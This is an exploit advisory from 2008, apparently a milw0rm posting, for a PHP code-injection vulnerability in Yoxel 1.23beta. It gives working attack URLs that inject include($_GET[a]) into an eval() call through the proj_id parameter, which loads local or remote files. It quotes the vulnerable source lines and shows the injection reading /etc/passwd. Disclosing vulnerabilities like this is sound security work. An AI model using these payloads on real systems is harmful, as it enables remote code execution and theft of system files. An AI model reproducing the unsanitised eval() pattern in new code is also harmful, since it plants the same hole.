@@ -1,0 +1,66 @@
+
+  :::::::-.   ...    ::::::.    :::.
+   ;;,   `';, ;;     ;;;`;;;;,  `;;;
+   `[[     [[[['     [[[  [[[[[. '[[
+    $$,    $$$$      $$$  $$$ "Y$c$$
+    888_,o8P'88    .d888  888    Y88
+    MMMMP"`   "YmmMMMM""  MMM     YM
+
+   [ Discovered by dun \ dun[at]strcpy.pl ]
+
+ ###############################################################
+ #  [ Yoxel <= 1.23beta ]   PHP code Injection Vulnerability   #
+ ###############################################################
+ #
+ # Script: "Yoxel is a hidden gem. This Open Source project provides customer/business focused Agile Product Management tools in PHP."
+ #
+ # Script site: http://www.yoxel.com/
+ # Download: http://sourceforge.net/projects/yoxel/
+ #
+ # Vuln:
+ # http://site.com/[yoxel_v1.23beta]/itpm/itpm_estimate.php?a=LOCAL_OR_REMOTE_FILE&rid=1&proj_id=);include($_GET[a]);die(2
+ # http://site.com/[yoxel_v1.23beta]/itpm/itpm_estimate.php?a=LOCAL_OR_REMOTE_FILE&proj_id=);include($_GET[a]);die(2
+ # 
+ #
+ # (1) Bug: ./yoxel_v1.23beta/itpm/itpm_estimate.php (line: 40)
+ #
+ # ...
+ #    require_once('includes/project/estimate_inc.php');
+ # ... 			    
+ #
+ # 
+ # (2) Bug: ./yoxel_v1.23beta/includes/project/estimate_inc.php (lines: 85-99)
+ #
+ # ...
+ #	if(isset($_GET['rid'])){
+ #		$rids=explode(':',$_GET['rid']);
+ #		if(isset($_GET['proj_id']) && $_GET['proj_id']){
+ #			$proj_id=$_GET['proj_id'];
+ #			eval("\$pps= new $cname(".$_GET['proj_id'].");");		// PHP inj 1
+ #		}
+ #	}elseif(isset($_GET['proj_id']) && !empty($_GET['proj_id'])){
+ # 		$proj_id=$_GET['proj_id'];
+ #
+ #		if(isset($_GET['pr_list_type']))
+ # 			$plt=$_GET['pr_list_type'];
+ #		else
+ # 			$plt='full';
+ # 
+ #		eval("\$pps= new $cname($proj_id);");					// PHP inj 2
+ # ... 			    
+ #
+ #				 
+ # After php injection: eval( $pps= new ITPlan();include('/etc/passwd');die(2); );
+ #
+ # IMPORTANT: This bug doesn't work, when you aren't logged in Yoxel ;(((
+ #
+ # 
+ ###############################################
+ # Greetz: D3m0n_DE * str0ke * and otherz..
+ ###############################################
+
+ [ dun / 2008 ] 
+
+*******************************************************************************************
+
+# milw0rm.com [2008-09-27]
